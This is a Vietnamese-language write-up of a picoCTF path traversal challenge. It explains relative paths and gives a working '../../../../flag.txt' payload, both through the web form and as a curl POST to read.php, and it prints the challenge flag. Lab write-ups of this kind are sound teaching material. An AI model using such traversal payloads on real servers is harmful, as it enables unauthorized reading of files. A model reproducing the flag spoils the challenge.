- link: http://saturn.picoctf.net:55793/
- We know that the website files live in /usr/share/nginx/html/ and the flag is at /flag.txt but the website is filtering absolute file paths. Can you get past the filter to read the flag?
- bài này giúp ta học các vượt quyền truy cập vào các thư mục mẹ <tôi nghĩ vậy>
## Giải
# Thực hiện trực tiếp trên web:
- truy cập vào trang web thấy xuất hiện ô nhập các file để check thử nhập `/flag.txt` thì xuất hiện thông báo "Not Authorized"
- có nghĩa tôi không có quyền truy cập vào file và tôi tìm cách leo quyền
- tôi thử `../html/divine-comedy.txt` ở việc làm này tôi đề cập đến một file có tên "divine-comedy.txt" trong thư mục "html" nằm trực tiếp bên ngoài thư mục hiện tại. hơi khó hiểu phải không :>
- tôi đã tìm được 1 ví dụ trực quan:
- root
  > documents
    > file1.txt
    > file2.txt
  > html
    > divine-comedy.txt
    > index.html 
>Nếu bạn đang đứng tại thư mục "documents" và bạn muốn truy cập vào file "divine-comedy.txt" trong thư mục "html", bạn có thể sử dụng đường dẫn tương đối "../html/divine-comedy.txt".
>".." nghĩa là thư mục cha (thư mục gốc hoặc thư mục mẹ).
>"../html" nghĩa là đi từ thư mục "documents" lên thư mục cha "root", rồi vào thư mục "html".
Cuối cùng, "divine-comedy.txt" là tên file bạn muốn truy cập.
- vì đường dẫn đến `/flag.txt` phải qua 4 thư 1 nên tôi sẽ leo 4 lần
- điền vào: `../../../../flag.txt`
- flag hiện ra trước mắt hehehe: `picoCTF{7h3_p47h_70_5ucc355_e5a6fcbc}`

# Thực hiện trên terminal Kali:
- tôi truy cập đến source code của trang web trên bằng `curl http://saturn.picoctf.net:55793/`
- đoạn cuối ghi như này:
-  <form role="form" action="read.php" method="post">
      <input type="text" name="filename" placeholder="Filename" required></br>
      <button type="submit" name="read">Read</button>
> Khi người dùng nhập tên tệp vào trường nhập liệu và nhấn nút "Read", biểu mẫu sẽ gửi dữ liệu đến tệp xử lý "read.php" bằng phương thức POST. Dữ liệu trong trường nhập liệu sẽ được gửi dưới dạng cặp khóa-giá trị, trong trường này là "filename" và giá trị nhập liệu tương ứng. Tệp xử lý "read.php" có thể lấy giá trị này và thực hiện các xử lý liên quan, chẳng hạn như đọc nội dung của tệp tin được chỉ định bởi tên tệp.
- tôi Post đến trang web đó và gửi đi `../../../../flag.txt` như ở trên `curl -X POST http://saturn.picoctf.net:55793/read.php --data "filename=../../../../flag.txt" `
- trong đó:
> -X :request:
> POST: truy cập
- flag đã hiện ra nhưng tôi cần xử lí 1 chút để chỉ nhận được mỗi flag thôi <màu mè tí>
- nhập ` curl -X POST http://saturn.picoctf.net:55793/read.php --data "filename=../../../../flag.txt" | grep -oE "picoCTF{.*?}" --color=none ` để nhận được ngay flag
